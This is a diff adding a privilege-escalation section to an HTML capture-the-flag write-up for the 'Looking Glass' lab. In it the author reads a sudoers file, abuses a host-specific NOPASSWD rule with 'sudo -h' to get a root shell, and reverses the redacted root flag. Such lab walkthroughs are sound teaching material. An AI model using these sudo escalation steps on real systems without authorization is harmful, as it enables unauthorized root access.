@@ -370,7 +370,47 @@ alice@looking-glass:~$
         </div>
         <div class="wt-section" id="privesc">
             <h1> Privilege Escalation </h1>
-            
+            <p class="writeup-text"> Okay, we are logged as Alice. What's next ? </p>
+            <p class="writeup-text"> As we are connected with ssh key, we don't have any password for sudo -l. But let's try to see what the sudoers file contain. </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+alice@looking-glass:$ cd /etc/sudoers.d/
+alice@looking-glass:/etc/sudoers.d$ ls
+
+README  alice  jabberwock  tweedles
+
+alice@looking-glass:/etc/sudoers.d$ cat alice
+
+alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
+                </code>
+            </p>
+            <p class="writeup-text"> Nice ! We found someting really interesting ! It means that we can run /bin/bash as root with the help of ssalg-gnikool host. Let's try it : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+alice@looking-glass:/etc/sudoers.d$ sudo -h ssalg-gnikool /bin/bash
+sudo: unable to resolve host ssalg-gnikool
+
+root@looking-glass:/etc/sudoers.d#
+                </code>
+            </p>
+            <p class="writeup-text"> Let's go ! We are finally root ! Let's display root.txt flag : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+root@looking-glass:/etc/sudoers.d# cat /root/root.txt
+
+}DETCADER{mht
+                </code>
+            </p>
+            <p class="writeup-text"> Unfortunately, the flag seems to be reversed. We can re-reverse it and get the right flag : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+root@looking-glass:/etc/sudoers.d# python3 -c 'print("}DETCADER{mht"[::-1])'
+
+thm{REDACTED}
+                </code>
+            </p>
+            <p class="writeup-text challenge-answer"><span> Get the root flag ? </span> Answer : thm{REDACTED} </p>
+            <p class="writeup-text"> Challenge solved ! Kinda strange but really nice to do. </p>
         </div>
     </main>
 
